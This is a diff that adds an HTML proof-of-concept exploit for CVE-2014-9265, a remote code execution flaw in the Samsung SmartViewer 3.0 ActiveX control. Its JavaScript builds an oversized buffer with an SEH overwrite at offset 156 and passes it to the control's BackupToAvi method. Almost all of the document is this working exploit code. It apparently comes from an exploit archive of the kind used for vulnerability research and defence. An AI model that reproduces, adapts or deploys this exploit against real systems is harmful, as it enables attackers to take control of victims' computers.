@@ -1,0 +1,45 @@
+<html>
+<!--
+Samsung SmartViewer BackupToAvi Remote Code Execution PoC 
+PoC developed by Praveen Darshanam 
+
+For more details refer
+http://darshanams.blogspot.com
+http://blog.disects.com/2015/01/samsung-smartviewer-backuptoavi-remote.html
+Original Vulnerability Discovered by rgod
+Vulnerable: Samsung SmartViewer 3.0
+Tested on Windows 7 Ultimate N SP1
+http://www.cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-9265
+-->
+
+<object classid='clsid:208650B1-3CA1-4406-926D-45F2DBB9C299' id='target' ></object>
+<script >
+ var payload_length = 15000;
+ var arg1=1;
+ var arg2=1;
+ var arg3=1;
+ //blank strings
+ var junk = "";
+ var buf1 = "";
+ var buf2 = "";
+
+ //offset to SE is 156, initial analysis using metasploit cyclic pattern
+ for (i=0; i<156; i++)
+ {
+  buf1 += "A";
+ }
+ var nseh = "DD";
+ var seh = "\x87\x10";	//from Vulnerable DLL
+ junk = buf1 + nseh + seh;
+
+ //remaining buffer
+ for (j=0; j<(payload_length-junk.length); j++)
+ {
+  buf2 += "B";
+ }
+ //final malicious buffer
+ var fbuff = junk + buf2;
+ target.BackupToAvi(arg1 ,arg2 ,arg3 ,fbuff);
+
+</script>
+</html>
